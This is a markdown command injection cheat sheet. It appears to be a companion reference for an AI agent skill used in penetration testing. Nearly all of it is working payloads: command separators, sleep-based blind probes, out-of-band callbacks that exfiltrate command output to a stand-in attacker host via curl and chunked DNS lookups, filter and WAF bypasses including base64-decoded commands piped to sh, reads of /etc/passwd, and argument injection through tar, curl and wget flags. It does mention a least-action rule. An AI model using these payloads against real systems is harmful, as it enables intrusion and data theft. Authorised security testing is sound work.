# Command injection cheat sheet

Companion to `SKILL.md`. Work the whole set on a suspected sink before ruling it out: in-band →
blind time → OOB, and try every separator + space/keyword bypass.

## Separators (break out of the intended command)
```
; id            &&  id           |  id           || id
`id`            $(id)           %0a id (newline)  %0d id
& id (bg, Windows/POSIX)        \n id
```

## Blind — time based (no output)
```
Linux    ; sleep 10             $(sleep 10)      `sleep 10`      %0asleep 10
Windows  & ping -n 10 127.0.0.1     & timeout 10
cond.    ; [ $(id -u) = 0 ] && sleep 10          # only sleeps if condition true (oracle)
```

## Blind — OOB (DNS/HTTP callback; also exfils output)
```
; nslookup $(whoami).oob.attacker.tld
; curl http://oob.attacker.tld/$(id|base64)
; ping -c1 $(whoami).oob.attacker.tld
Windows  & nslookup %USERNAME%.oob.attacker.tld
use interactsh / Burp Collaborator as the listener
```

## Space bypass (spaces filtered)
```
cat${IFS}/etc/passwd      cat$IFS$9/etc/passwd      {cat,/etc/passwd}
X=$'\x20';cat$X/etc/passwd     cat</etc/passwd     tab (%09)
```

## Keyword / char bypass (WAF or blacklist)
```
quotes split      w'h'o'am'i     wh""oami     who$@ami
concat/vars       a=who;b=ami;$a$b
globbing (paths)  /???/c?t /???/p??swd     /bin/c\at
encoding          echo aWQ=|base64 -d|sh          $(printf '\x69\x64')
no-slash          IFS-tricks + $PATH lookups; ${PATH:0:1}=/
case (Windows)    WhOaMi ; cmd /c "whoami"
comment tail      id #     id %00
```

## Argument injection (can't break out, but can add flags — still high impact)
```
curl  → add -o / --output (write file), -F, -K (read attacker config)
tar   → --checkpoint=1 --checkpoint-action=exec=sh payload
zip   → -T --unzip-command
find  → -exec ; ...
wget  → --post-file / -O
ffmpeg/ImageMagick → SSRF/file-read via crafted input (see also web-ssrf, file-upload)
```

## Get output when blind
```
redirect to webroot   ; id > /var/www/html/o.txt   then fetch /o.txt
OOB exfil             ; curl http://oob/$(id|base64 -w0)
DNS exfil (chunk)     ; for c in $(id|base64 -w0|fold -w30);do nslookup $c.oob.tld;done
```

## Verify
`id` / `hostname` / `whoami` echoed back, a measurable sleep delay, or an OOB hit carrying output.
Least action — no destructive commands, no data exfil beyond proving execution.

## References
PayloadsAllTheThings (Command Injection); PortSwigger OS command injection; GTFOBins (argument abuse); commix.
